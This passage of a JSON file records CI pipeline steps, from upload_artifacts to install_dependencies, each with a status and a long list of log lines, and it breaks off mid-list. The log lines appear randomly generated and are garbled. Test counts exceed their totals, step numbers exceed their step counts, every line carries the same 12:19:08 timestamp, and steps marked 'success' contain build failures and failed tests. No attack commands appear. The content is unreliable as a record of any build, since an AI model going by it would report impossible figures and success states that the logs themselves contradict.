          "Uploading artifact 'build' (48 files)",
          "Processing...",
          "  PASS: test_auth_login (297ms)",
          "Success!",
          "WARNING: react has known vulnerabilities",
          "[12:19:08] DEBUG: Connection pool: 11 active",
          "\u2717 build failed with exit code 75",
          "Completed.",
          "Transforming 411 files...",
          "[12:19:08] DEBUG: Query executed in 37ms",
          "[12:19:08] INFO: Cache refreshed",
          "Step 12/18: Testing",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Connecting to cloud.services:443...",
          "pip: Installing build dependencies...",
          "Environment: staging",
          "[12:19:08] INFO: Starting build process",
          "[12:19:08] DEBUG: Connection pool: 13 active",
          "Step 14/25: Installing dependencies",
          "Compiling src/index.js...",
          "[12:19:08] INFO: Processing request",
          "Ready.",
          "Cache restored successfully (140MB)",
          "Step 19/19: Building",
          "Artifact uploaded: build.tar.gz (48MB)",
          "Compiling utils/service.java...",
          "Loading...",
          "Ready.",
          "\u2713 validate completed",
          "Switched to branch 'feature/task-574'",
          "npm notice: created a lockfile",
          "Image pulled successfully",
          "Using Node.js 17.1.4",
          "Completed.",
          "[12:19:08] INFO: Connecting to database",
          "Image pulled successfully",
          "Step 2/20: Linting",
          "HEAD is now at 05703cb",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Test Suites: 16 passed, 38 total",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Done.",
          "Compiling components/handler.rs...",
          "Artifact uploaded: dist.zip (67MB)",
          "Using Node.js 14.10.10",
          "Building Docker image...",
          "pip: Installing build dependencies...",
          "Time: 13.142s",
          "\u2713 All checks passed",
          "[12:19:08] DEBUG: Query executed in 44ms",
          "Connection established",
          "\u2717 build failed with exit code 55",
          "[12:19:08] WARN: Deprecated API usage",
          "npm notice: created a lockfile",
          "Connection established",
          "Tests: 175 passed, 358 total",
          "[12:19:08] INFO: Cache refreshed",
          "Optimizing 76 modules...",
          "[12:19:08] INFO: Cache refreshed",
          "yarn add: Done in 1.62s",
          "FAILED: test_api_health",
          "HEAD is now at 3ed0adf",
          "Layer 3/8: ENV command",
          "Environment: production",
          "Transforming 296 files...",
          "Using Python 3.10",
          "[12:19:08] DEBUG: Loading configuration",
          "Step 3/18: Installing dependencies",
          "  PASS: test_api_health (211ms)",
          "Waiting...",
          "pip install: Successfully installed eslint-1.19",
          "pip: Collecting lodash",
          "Exception: ValueError",
          "Compiling utils/service.java...",
          "Pushing to registry...",
          "[12:19:08] INFO: Starting build process",
          "Compiling lib/handler.rs...",
          "Already up to date.",
          "Compiling lib/index.js...",
          "Already up to date.",
          "Artifact uploaded: dist.zip (43MB)",
          "HEAD is now at 5c3dbf8",
          "[12:19:08] INFO: Request completed",
          "HEAD is now at 01f99ac",
          "WARNING: lodash has known vulnerabilities",
          "Cache hit for key-6123",
          "Using Python 3.12",
          "TLS handshake completed",
          "[12:19:08] INFO: Starting build process",
          "Compiling src/main.py...",
          "pip install: Successfully installed jest-4.15",
          "[12:19:08] INFO: Request completed",
          "[12:19:08] INFO: Connecting to database",
          "Already up to date.",
          "[12:19:08] INFO: Processing request",
          "WARNING: eslint has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "FAILED: test_db_connect",
          "Step 16/18: Deploying",
          "WARNING: eslint has known vulnerabilities",
          "Pulling image: alpine:3.11",
          "Verifying...",
          "Cache invalidated: build",
          "Fetching submodules...",
          "Artifact uploaded: build.tar.gz (26MB)",
          "Loading...",
          "Snapshots: 38 passed, 3 total",
          "WARNING: axios has known vulnerabilities",
          "Verifying...",
          "POST /upload - 201 (19ms)",
          "pip: Downloading webpack-4.4.tar.gz",
          "npm install: resolved 1442 packages",
          "Waiting...",
          "Checking out master branch",
          "[12:19:08] DEBUG: Loading configuration",
          "Snapshots: 30 passed, 31 total",
          "  PASS: test_auth_login (89ms)",
          "[12:19:08] DEBUG: Query executed in 99ms",
          "pip: Collecting prettier",
          "\u2713 Step 'install' succeeded",
          "HEAD is now at 6c9aa58",
          "Platform: win32-x64",
          "Cache invalidated: dependencies",
          "TLS handshake completed",
          "HEAD is now at c16f974",
          "[12:19:08] DEBUG: Query executed in 86ms",
          "[12:19:08] WARN: Deprecated API usage",
          "Already up to date.",
          "POST /data - 200 (397ms)",
          "Using Python 3.11",
          "Step 14/16: Building",
          "OK",
          "[12:19:08] INFO: Request completed",
          "Processing...",
          "HEAD is now at 50bc3fd",
          "Uploading artifact 'dist' (40 files)",
          "Ready.",
          "Building Docker image...",
          "[12:19:08] INFO: Connecting to database",
          "Loading...",
          "=== Step upload_artifacts completed ==="
        ]
      },
      {
        "name": "integration_tests",
        "status": "success",
        "started_at": "2025-11-24T12:20:10.363873",
        "finished_at": "2025-11-24T12:20:29.014901",
        "log_lines": [
          "=== Step: integration_tests ===",
          "[12:19:08] DEBUG: Memory usage: 1719MB",
          "Checking out master branch",
          "  PASS: unit/test_db_connect.spec.js",
          "[12:19:08] ERROR: Connection failed",
          "Connection established",
          "Building Docker image...",
          "Optimizing 39 modules...",
          "Step 12/15: Building",
          "[12:19:08] DEBUG: Memory usage: 1043MB",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:19:08] INFO: Starting build process",
          "npm notice: package.json updated",
          "Connection established",
          "Pushing to registry...",
          "Loading...",
          "pip: Collecting express",
          "WARNING: express has known vulnerabilities",
          "Platform: darwin-arm64",
          "Environment: staging",
          "WARNING: eslint has known vulnerabilities",
          "Test Suites: 33 passed, 34 total",
          "Tests: 272 passed, 74 total",
          "Minifying main.js",
          "TLS handshake completed",
          "POST /upload - 201 (346ms)",
          "Switched to branch 'bugfix/task-383'",
          "Pulling image: alpine:latest",
          "[12:19:08] INFO: Starting build process",
          "\u2713 Task completed in 1768ms",
          "Pushing to registry...",
          "Connecting to startup.dev:443...",
          "Using Python 3.12",
          "GET /api - 200 (67ms)",
          "Minifying vendor.js",
          "Pushing to registry...",
          "[12:19:08] WARN: Deprecated API usage",
          "Loading...",
          "\u2713 test completed",
          "\u2713 All checks passed",
          "[12:19:08] ERROR: Connection failed",
          "Platform: win32-x64",
          "Compiling src/utils.go...",
          "GET /api - 204 (13ms)",
          "WARNING: lodash has known vulnerabilities",
          "Environment: staging",
          "Cache miss for key-7019",
          "NODE_ENV=test",
          "Cache restored successfully (429MB)",
          "Snapshots: 23 passed, 48 total",
          "Pulling image: node:18",
          "POST /api - 201 (374ms)",
          "Compiling utils/handler.rs...",
          "  PASS: unit/test_user_create.spec.js",
          "Finished.",
          "Creating production build...",
          "Transforming 677 files...",
          "Minifying vendor.js",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Step 9/15: Linting",
          "Compiling utils/utils.go...",
          "OK",
          "Using Python 3.10",
          "Success!",
          "npm install: added 196 packages",
          "WARNING: express has known vulnerabilities",
          "POST /data - 200 (487ms)",
          "Processing...",
          "Tests: 348 passed, 172 total",
          "Tests: 299 passed, 375 total",
          "[12:19:08] DEBUG: Query executed in 11ms",
          "[12:19:08] INFO: Cache refreshed",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Waiting...",
          "POST /api - 202 (329ms)",
          "Artifact downloaded: 11MB",
          "NODE_ENV=production",
          "[12:19:08] INFO: Processing request",
          "npm notice: created a lockfile",
          "Loading...",
          "POST /api - 201 (279ms)",
          "Step 13/16: Building",
          "Cache restored successfully (111MB)",
          "pip: Collecting prettier",
          "[12:19:08] WARN: Deprecated API usage",
          "[12:19:08] WARN: Deprecated API usage",
          "yarn add: Done in 6.86s",
          "[12:19:08] DEBUG: Memory usage: 1553MB",
          "Snapshots: 26 passed, 26 total",
          "Compiling components/handler.rs...",
          "Pushing to registry...",
          "\u2713 deploy completed",
          "npm install: resolved 1593 packages",
          "Switched to branch 'feature/task-396'",
          "Connecting to acme.corp:443...",
          "Building Docker image...",
          "Installing axios@1.20.10",
          "Connection established",
          "Ready.",
          "Fetching submodules...",
          "Cache invalidated: dependencies",
          "Test Suites: 30 passed, 48 total",
          "Cache invalidated: build",
          "POST /upload - 200 (91ms)",
          "Completed.",
          "[12:19:08] DEBUG: Initializing service",
          "Artifact uploaded: build.tar.gz (18MB)",
          "Platform: linux-x64",
          "[12:19:08] DEBUG: Query executed in 98ms",
          "Finished.",
          "WARNING: webpack has known vulnerabilities",
          "Ran 141 tests in 9s",
          "Layer 2/12: ENV command",
          "Ran 166 tests in 7s",
          "Using Python 3.9",
          "Artifact downloaded: 34MB",
          "Generating source maps...",
          "Compiling components/service.java...",
          "OK",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Compiling lib/service.java...",
          "Waiting...",
          "Image pulled successfully",
          "Compiling src/app.ts...",
          "Cache saved successfully",
          "Platform: win32-x64",
          "Optimizing 33 modules...",
          "Step 11/15: Deploying",
          "Image pulled successfully",
          "[12:19:08] WARN: Deprecated API usage",
          "Pushing to registry...",
          "Image pulled successfully",
          "Coverage: 90% statements, 82% branches",
          "npm notice: created a lockfile",
          "Step 2/16: Installing dependencies",
          "\u2713 Task completed in 1096ms",
          "Verifying...",
          "Tests: 271 passed, 235 total",
          "[12:19:08] WARN: Deprecated API usage",
          "[12:19:08] INFO: Processing request",
          "pip: Collecting react",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Layer 7/9: ENV command",
          "[12:19:08] DEBUG: Loading configuration",
          "Step 7/19: Building",
          "Step 3/15: Installing dependencies",
          "npm notice: package.json updated",
          "Success!",
          "Environment: staging",
          "Compiling lib/utils.go...",
          "Uploading artifact 'dist' (36 files)",
          "TLS handshake completed",
          "[12:19:08] DEBUG: Memory usage: 1959MB",
          "Loading...",
          "Connection established",
          "[12:19:08] DEBUG: Initializing service",
          "NODE_ENV=development",
          "Uploading artifact 'coverage' (16 files)",
          "npm notice: package.json updated",
          "Bundling runtime.css",
          "WARNING: jest has known vulnerabilities",
          "Building Docker image...",
          "Checking out develop branch",
          "Completed.",
          "\u2713 All checks passed",
          "Transforming 387 files...",
          "=== Step integration_tests completed ==="
        ]
      },
      {
        "name": "deploy_production",
        "status": "success",
        "started_at": "2025-11-24T12:20:29.014901",
        "finished_at": "2025-11-24T12:20:32.745107",
        "log_lines": [
          "=== Step: deploy_production ===",
          "Step 2/16: Building",
          "Step 19/23: Linting",
          "Exception: RuntimeError",
          "[12:19:08] INFO: Processing request",
          "Transforming 987 files...",
          "Ran 68 tests in 41s",
          "Cache invalidated: build",
          "Completed.",
          "Compiling components/utils.go...",
          "Compiling src/index.js...",
          "Bundling main.css",
          "[12:19:08] INFO: Starting build process",
          "Step 8/21: Deploying",
          "[12:19:08] DEBUG: Query executed in 29ms",
          "  PASS: unit/test_api_health.spec.js",
          "Cache miss for key-7606",
          "[12:19:08] INFO: Starting build process",
          "Test Suites: 23 passed, 15 total",
          "Verifying...",
          "WARNING: react has known vulnerabilities",
          "\u2713 Step 'test' succeeded",
          "Ran 87 tests in 50s",
          "WARNING: lodash has known vulnerabilities",
          "Minifying app.js",
          "Done.",
          "  PASS: test_auth_login (493ms)",
          "Installing jest@5.16.8",
          "Step 12/22: Running migrations",
          "Bundling main.js",
          "npm notice: package.json updated",
          "Cache restored successfully (391MB)",
          "[12:19:08] ERROR: Connection failed",
          "Success!",
          "Step 10/16: Testing",
          "HEAD is now at 90c28d7",
          "Installing lodash@2.17.0",
          "OK",
          "Step 1/25: Deploying",
          "\u2713 Step 'build' succeeded",
          "Cache invalidated: node_modules",
          "[12:19:08] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Step 11/17: Installing dependencies",
          "\u2713 Step 'checkout' succeeded",
          "POST /api - 200 (185ms)",
          "[12:19:08] DEBUG: Initializing service",
          "Compiling utils/index.js...",
          "Uploading artifact 'coverage' (16 files)",
          "[12:19:08] INFO: Request completed",
          "Cache restored successfully (428MB)",
          "Loading...",
          "Success!",
          "TLS handshake completed",
          "Already up to date.",
          "Connecting to test.io:443...",
          "Cache restored successfully (146MB)",
          "[12:19:08] INFO: Processing request",
          "npm notice: package.json updated",
          "Cache saved successfully",
          "HEAD is now at ee4dcea",
          "Layer 6/9: RUN command",
          "Step 20/15: Running migrations",
          "Waiting...",
          "Cache invalidated: build",
          "[12:19:08] DEBUG: Query executed in 63ms",
          "Pushing to registry...",
          "  PASS: test_auth_login (192ms)",
          "Uploading artifact 'dist' (39 files)",
          "Environment: production",
          "Installing lodash@4.12.4",
          "Environment: production",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Completed.",
          "Platform: linux-x64",
          "Fetching submodules...",
          "Cache restored successfully (188MB)",
          "[12:19:08] DEBUG: Memory usage: 236MB",
          "Cache miss for key-6050",
          "npm notice: created a lockfile",
          "Fetching submodules...",
          "Step 4/17: Running migrations",
          "\u2713 deploy completed",
          "Coverage: 88% statements, 66% branches",
          "npm notice: package.json updated",
          "Coverage: 80% statements, 97% branches",
          "[12:19:08] DEBUG: Loading configuration",
          "Success!",
          "[12:19:08] INFO: Cache refreshed",
          "Fetching submodules...",
          "npm install: resolved 190 packages",
          "npm notice: package.json updated",
          "[12:19:08] WARN: Deprecated API usage",
          "OK",
          "Artifact uploaded: build.tar.gz (10MB)",
          "Compiling utils/index.js...",
          "Success!",
          "Environment: development",
          "Cache saved successfully",
          "Waiting...",
          "Compiling components/index.js...",
          "Bundling runtime.css",
          "Already up to date.",
          "Time: 80.574s",
          "\u2713 build completed",
          "Cache saved successfully",
          "Verifying...",
          "\u2717 build failed with exit code 23",
          "Using Python 3.9",
          "Step 13/23: Deploying",
          "Layer 3/14: RUN command",
          "\u2717 build failed with exit code 104",
          "  PASS: unit/test_db_connect.spec.js",
          "npm install: resolved 491 packages",
          "Tests: 457 passed, 233 total",
          "[12:19:08] INFO: Processing request",
          "[12:19:08] INFO: Request completed",
          "\u2713 package completed",
          "Finished.",
          "[12:19:08] DEBUG: Connection pool: 15 active",
          "GET /status - 204 (93ms)",
          "Compiling components/index.js...",
          "[12:19:08] DEBUG: Initializing service",
          "npm notice: created a lockfile",
          "Step 20/24: Running migrations",
          "Waiting...",
          "Building Docker image...",
          "Ran 172 tests in 23s",
          "NODE_ENV=development",
          "Switched to branch 'bugfix/task-690'",
          "Completed.",
          "yarn add: Done in 5.88s",
          "Cache hit for key-1069",
          "Finished.",
          "Connection established",
          "pip install: Successfully installed lodash-1.18",
          "pip: Collecting react",
          "Image pulled successfully",
          "Using Node.js 20.0.6",
          "Building Docker image...",
          "Compiling utils/handler.rs...",
          "Connecting to acme.corp:443...",
          "Fetching submodules...",
          "Verifying...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Optimizing 30 modules...",
          "Environment: test",
          "  PASS: unit/test_user_create.spec.js",
          "pip: Collecting lodash",
          "Connection established",
          "Compiling components/main.py...",
          "Step 12/16: Running migrations",
          "Test Suites: 44 passed, 38 total",
          "Platform: darwin-arm64",
          "Layer 3/8: COPY command",
          "Step 9/17: Building",
          "Checking out main branch",
          "npm notice: package.json updated",
          "[12:19:08] INFO: Starting build process",
          "Transforming 513 files...",
          "Cache hit for key-5713",
          "yarn add: Done in 11.2s",
          "[12:19:08] DEBUG: Query executed in 59ms",
          "npm install: added 64 packages",
          "Completed.",
          "Cache restored successfully (187MB)",
          "=== Step deploy_production completed ==="
        ]
      },
      {
        "name": "type_check",
        "status": "success",
        "started_at": "2025-11-24T12:20:32.745107",
        "finished_at": "2025-11-24T12:20:42.070621",
        "log_lines": [
          "=== Step: type_check ===",
          "\u2713 All checks passed",
          "npm install: resolved 734 packages",
          "Cache restored successfully (373MB)",
          "[12:19:08] DEBUG: Memory usage: 1500MB",
          "Snapshots: 21 passed, 49 total",
          "[12:19:08] DEBUG: Loading configuration",
          "Compiling utils/utils.go...",
          "Compiling utils/utils.go...",
          "Processing...",
          "Processing...",
          "pip: Installing build dependencies...",
          "yarn add: Done in 30.29s",
          "\u2713 Task completed in 4368ms",
          "WARNING: express has known vulnerabilities",
          "Layer 9/11: RUN command",
          "Artifact uploaded: dist.zip (21MB)",
          "[12:19:08] WARN: Deprecated API usage",
          "Platform: linux-x64",
          "Generating source maps...",
          "[12:19:08] INFO: Connecting to database",
          "Step 20/22: Testing",
          "Test Suites: 13 passed, 41 total",
          "[12:19:08] WARN: Deprecated API usage",
          "[12:19:08] INFO: Request completed",
          "Connecting to test.io:443...",
          "Using Node.js 15.4.7",
          "Bundling vendor.css",
          "WARNING: webpack has known vulnerabilities",
          "Coverage: 72% statements, 66% branches",
          "FAILED: test_user_create",
          "Building Docker image...",
          "Step 12/18: Deploying",
          "Step 17/19: Linting",
          "Coverage: 82% statements, 99% branches",
          "Building Docker image...",
          "Processing...",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (50MB)",
          "TLS handshake completed",
          "[12:19:08] INFO: Starting build process",
          "Compiling lib/app.ts...",
          "Artifact uploaded: build.tar.gz (46MB)",
          "[12:19:08] INFO: Cache refreshed",
          "Verifying...",
          "\u2713 validate completed",
          "Test Suites: 15 passed, 6 total",
          "Artifact uploaded: dist.zip (67MB)",
          "Snapshots: 42 passed, 46 total",
          "Environment: test",
          "npm install: added 285 packages",
          "yarn add: Done in 9.81s",
          "yarn add: Done in 6.72s",
          "Artifact uploaded: dist.zip (70MB)",
          "Connection established",
          "Bundling styles.css",
          "GET /api - 201 (42ms)",
          "npm install: added 382 packages",
          "[12:19:08] DEBUG: Query executed in 81ms",
          "Compiling components/handler.rs...",
          "Compiling src/service.java...",
          "Artifact downloaded: 44MB",
          "[12:19:08] ERROR: Connection failed",
          "Success!",
          "Finished.",
          "Pushing to registry...",
          "[12:19:08] WARN: Deprecated API usage",
          "Bundling runtime.css",
          "Using Python 3.10",
          "Cache saved successfully",
          "Cache restored successfully (463MB)",
          "[12:19:08] INFO: Request completed",
          "Ran 197 tests in 51s",
          "Installing lodash@3.17.2",
          "Uploading artifact 'dist' (11 files)",
          "NODE_ENV=production",
          "Finished.",
          "Step 7/17: Running migrations",
          "[12:19:08] DEBUG: Loading configuration",
          "Coverage: 100% statements, 89% branches",
          "npm install: resolved 1115 packages",
          "Connection established",
          "Test Suites: 37 passed, 14 total",
          "Cache hit for key-5713",
          "Cache saved successfully",
          "WARNING: react has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Finished.",
          "Pushing to registry...",
          "Processing...",
          "Verifying...",
          "Bundling main.js",
          "npm notice: created a lockfile",
          "Compiling utils/app.ts...",
          "Step 12/24: Installing dependencies",
          "[12:19:08] DEBUG: Connection pool: 1 active",
          "Step 11/25: Testing",
          "Image pulled successfully",
          "npm install: resolved 574 packages",
          "Connection established",
          "WARNING: jest has known vulnerabilities",
          "Time: 60.345s",
          "  PASS: unit/test_db_connect.spec.js",
          "Verifying...",
          "Step 2/16: Testing",
          "Using Python 3.11",
          "FAILED: test_auth_login",
          "pip: Collecting express",
          "Cache saved successfully",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "npm install: resolved 335 packages",
          "Minifying vendor.js",
          "Compiling components/handler.rs...",
          "Snapshots: 29 passed, 5 total",
          "Minifying vendor.js",
          "[12:19:08] WARN: Deprecated API usage",
          "[12:19:08] DEBUG: Query executed in 86ms",
          "[12:19:08] INFO: Connecting to database",
          "[12:19:08] INFO: Connecting to database",
          "Processing...",
          "npm install: resolved 1641 packages",
          "[12:19:08] INFO: Request completed",
          "Time: 100.768s",
          "Installing lodash@3.9.10",
          "npm install: added 260 packages",
          "Success!",
          "Time: 28.276s",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "GET /health - 200 (90ms)",
          "NODE_ENV=development",
          "POST /data - 201 (241ms)",
          "Image pulled successfully",
          "NODE_ENV=production",
          "Installing axios@5.2.7",
          "Optimizing 18 modules...",
          "Fetching submodules...",
          "[12:19:08] DEBUG: Initializing service",
          "WARNING: eslint has known vulnerabilities",
          "Fetching submodules...",
          "pip: Downloading jest-3.0.tar.gz",
          "Transforming 298 files...",
          "Bundling runtime.js",
          "Layer 3/12: ENV command",
          "Creating production build...",
          "[12:19:08] INFO: Connecting to database",
          "[12:19:08] DEBUG: Initializing service",
          "Connecting to test.io:443...",
          "[12:19:08] WARN: Deprecated API usage",
          "Building Docker image...",
          "Checking out master branch",
          "WARNING: react has known vulnerabilities",
          "[12:19:08] INFO: Processing request",
          "Completed.",
          "Connecting to acme.corp:443...",
          "Already up to date.",
          "Layer 6/15: RUN command",
          "Cache saved successfully",
          "Installing axios@4.19.5",
          "npm notice: created a lockfile",
          "Coverage: 81% statements, 98% branches",
          "[12:19:08] INFO: Processing request",
          "Using Python 3.10",
          "Step 5/19: Building",
          "Snapshots: 45 passed, 37 total",
          "Coverage: 79% statements, 88% branches",
          "Using Python 3.11",
          "=== Step type_check completed ==="
        ]
      },
      {
        "name": "save_cache",
        "status": "success",
        "started_at": "2025-11-24T12:20:42.070621",
        "finished_at": "2025-11-24T12:20:47.665929",
        "log_lines": [
          "=== Step: save_cache ===",
          "\u2713 build completed",
          "Step 8/25: Deploying",
          "Cache restored successfully (144MB)",
          "Checking out master branch",
          "WARNING: jest has known vulnerabilities",
          "Layer 9/8: ENV command",
          "Step 7/15: Testing",
          "Ran 56 tests in 53s",
          "Success!",
          "Step 14/21: Testing",
          "\u2713 All checks passed",
          "Completed.",
          "Cache invalidated: dependencies",
          "  PASS: test_db_connect (278ms)",
          "Platform: win32-x64",
          "Connecting to example.com:443...",
          "Image pulled successfully",
          "Cache saved successfully",
          "\u2713 deploy completed",
          "  PASS: unit/test_db_connect.spec.js",
          "yarn add: Done in 7.87s",
          "Step 7/16: Building",
          "Compiling src/app.ts...",
          "\u2713 Task completed in 1346ms",
          "Creating production build...",
          "[12:19:08] INFO: Processing request",
          "HEAD is now at 815d0d5",
          "NODE_ENV=production",
          "pip: Downloading eslint-2.20.tar.gz",
          "Step 7/20: Building",
          "FAILED: test_auth_login",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Finished.",
          "Installing webpack@4.16.8",
          "Compiling components/utils.go...",
          "Platform: linux-x64",
          "\u2713 build completed",
          "yarn add: Done in 15.71s",
          "Step 20/19: Installing dependencies",
          "npm notice: created a lockfile",
          "Connecting to test.io:443...",
          "Optimizing 86 modules...",
          "Transforming 774 files...",
          "Done.",
          "POST /data - 200 (139ms)",
          "Environment: production",
          "npm notice: package.json updated",
          "[12:19:08] DEBUG: Loading configuration",
          "[12:19:08] INFO: Processing request",
          "Processing...",
          "\u2713 All checks passed",
          "Finished.",
          "Cache saved successfully",
          "Uploading artifact 'dist' (44 files)",
          "Transforming 356 files...",
          "WARNING: lodash has known vulnerabilities",
          "Processing...",
          "Tests: 405 passed, 69 total",
          "WARNING: webpack has known vulnerabilities",
          "POST /upload - 200 (333ms)",
          "[12:19:08] DEBUG: Connection pool: 6 active",
          "Loading...",
          "Loading...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Success!",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Using Python 3.12",
          "Transforming 492 files...",
          "Verifying...",
          "Creating production build...",
          "Compiling src/app.ts...",
          "Optimizing 27 modules...",
          "npm notice: package.json updated",
          "Waiting...",
          "Step 2/22: Linting",
          "npm notice: package.json updated",
          "Test Suites: 25 passed, 29 total",
          "[12:19:08] ERROR: Connection failed",
          "\u2717 build failed with exit code 28",
          "yarn add: Done in 22.96s",
          "Finished.",
          "Step 16/20: Testing",
          "pip install: Successfully installed webpack-2.16",
          "\u2713 package completed",
          "pip install: Successfully installed react-5.7",
          "Cache invalidated: build",
          "[12:19:08] INFO: Starting build process",
          "[12:19:08] DEBUG: Memory usage: 1195MB",
          "[12:19:08] DEBUG: Connection pool: 6 active",
          "Transforming 435 files...",
          "POST /data - 202 (117ms)",
          "Creating production build...",
          "Exception: TypeError",
          "[12:19:08] INFO: Cache refreshed",
          "Artifact uploaded: build.tar.gz (8MB)",
          "Platform: linux-x64",
          "Compiling utils/handler.rs...",
          "Completed.",
          "Artifact uploaded: build.tar.gz (29MB)",
          "Processing...",
          "[12:19:08] WARN: Deprecated API usage",
          "HEAD is now at 11684c6",
          "\u2713 validate completed",
          "Step 18/23: Deploying",
          "Compiling lib/index.js...",
          "Compiling utils/main.py...",
          "  PASS: test_cache_hit (117ms)",
          "OK",
          "yarn add: Done in 13.28s",
          "Ready.",
          "Switched to branch 'bugfix/task-474'",
          "Step 5/24: Installing dependencies",
          "Verifying...",
          "Switched to branch 'hotfix/task-891'",
          "Step 2/24: Testing",
          "Cache saved successfully",
          "pip: Collecting prettier",
          "Step 12/25: Deploying",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "pip: Collecting express",
          "[12:19:08] DEBUG: Loading configuration",
          "Using Python 3.11",
          "pip: Installing build dependencies...",
          "  PASS: test_cache_hit (23ms)",
          "pip: Collecting lodash",
          "Connection established",
          "Creating production build...",
          "[12:19:08] INFO: Starting build process",
          "Creating production build...",
          "Artifact uploaded: build.tar.gz (21MB)",
          "Finished.",
          "pip: Installing build dependencies...",
          "Step 16/19: Building",
          "[12:19:08] INFO: Connecting to database",
          "Creating production build...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Platform: win32-x64",
          "Cache hit for key-6673",
          "[12:19:08] INFO: Request completed",
          "pip install: Successfully installed jest-2.15",
          "Ready.",
          "[12:19:08] DEBUG: Query executed in 42ms",
          "\u2717 build failed with exit code 42",
          "Compiling components/app.ts...",
          "Fetching submodules...",
          "[12:19:08] INFO: Connecting to database",
          "GET /status - 204 (1ms)",
          "HEAD is now at 88e0e28",
          "[12:19:08] DEBUG: Memory usage: 613MB",
          "pip: Installing build dependencies...",
          "Step 16/16: Linting",
          "Completed.",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "GET /health - 200 (25ms)",
          "pip install: Successfully installed eslint-3.5",
          "Cache saved successfully",
          "Step 15/17: Testing",
          "Cache restored successfully (483MB)",
          "Installing eslint@1.12.8",
          "Snapshots: 37 passed, 14 total",
          "pip install: Successfully installed lodash-4.4",
          "WARNING: react has known vulnerabilities",
          "Compiling src/app.ts...",
          "[12:19:08] WARN: Deprecated API usage",
          "\u2713 Task completed in 4552ms",
          "=== Step save_cache completed ==="
        ]
      },
      {
        "name": "install_dependencies",
        "status": "success",
        "started_at": "2025-11-24T12:20:47.665929",
        "finished_at": "2025-11-24T12:21:15.642471",
        "log_lines": [
          "=== Step: install_dependencies ===",
          "Cache hit for key-3794",
          "Fetching submodules...",
          "[12:19:08] DEBUG: Query executed in 11ms",
          "Cache invalidated: build",
          "Pulling image: node:18",
          "Step 11/25: Running migrations",
          "Step 8/24: Installing dependencies",
          "NODE_ENV=production",
          "Compiling components/main.py...",
          "WARNING: react has known vulnerabilities",
          "  PASS: test_cache_hit (355ms)",
          "Generating source maps...",
          "npm install: resolved 361 packages",
          "Switched to branch 'feature/task-723'",
          "Checking out main branch",
          "[12:19:08] WARN: Deprecated API usage",
          "Cache hit for key-3765",
          "Waiting...",
          "  PASS: test_auth_login (253ms)",
          "Waiting...",
          "Tests: 123 passed, 89 total",
          "[12:19:08] WARN: Deprecated API usage",
          "Done.",
          "Step 17/23: Testing",
          "Loading...",
          "Step 19/16: Testing",
          "Step 11/18: Deploying",
          "Pulling image: node:latest",
          "WARNING: express has known vulnerabilities",
          "Compiling utils/utils.go...",
          "[12:19:08] WARN: Deprecated API usage",
          "[12:19:08] WARN: Deprecated API usage",
          "Step 2/18: Running migrations",
          "Artifact downloaded: 44MB",
          "[12:19:08] DEBUG: Query executed in 87ms",
          "\u2713 Task completed in 3294ms",
          "Step 3/16: Deploying",
          "Cache hit for key-3760",
          "Loading...",
          "[12:19:08] INFO: Starting build process",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u2713 Step 'install' succeeded",
          "Creating production build...",
          "Verifying...",
          "Processing...",
          "Ready.",
          "npm notice: package.json updated",
          "\u2713 test completed",
          "Bundling vendor.js",
          "Generating source maps...",
          "Compiling lib/utils.go...",
          "\u2713 All checks passed",
          "Loading...",
          "Processing...",
          "[12:19:08] INFO: Starting build process",
          "Image pulled successfully",
          "Success!",
          "[12:19:08] DEBUG: Query executed in 45ms",
          "Done.",
          "Done.",
          "Pulling image: python:18",
          "\u2713 deploy completed",
          "Artifact uploaded: build.tar.gz (36MB)",
          "TLS handshake completed",
          "Environment: test",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Success!",
          "[12:19:08] INFO: Connecting to database",
          "HEAD is now at a16f0b9",
          "Creating production build...",
          "[12:19:08] INFO: Connecting to database",
          "Step 18/20: Building",
          "\u2713 All checks passed",
          "WARNING: prettier has known vulnerabilities",
          "Coverage: 86% statements, 85% branches",
          "Verifying...",
          "[12:19:08] INFO: Request completed",
          "Finished.",
          "Coverage: 73% statements, 86% branches",
          "npm notice: package.json updated",
          "Done.",
          "Step 10/22: Building",
          "Compiling components/service.java...",
          "\u2713 package completed",
          "  PASS: test_user_create (224ms)",
          "Creating production build...",
          "NODE_ENV=production",
          "Uploading artifact 'build' (1 files)",
          "\u2713 Task completed in 4878ms",
          "Already up to date.",
          "npm install: added 433 packages",
          "Switched to branch 'feature/task-500'",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u2713 All checks passed",
          "npm install: resolved 477 packages",
          "[12:19:08] DEBUG: Connection pool: 11 active",
          "[12:19:08] DEBUG: Memory usage: 806MB",
          "Ready.",
          "[12:19:08] INFO: Cache refreshed",
          "pip: Installing build dependencies...",
          "Step 14/21: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Compiling src/service.java...",
          "[12:19:08] DEBUG: Query executed in 76ms",
          "\u2717 build failed with exit code 89",
          "Connection established",
          "Step 10/15: Running migrations",
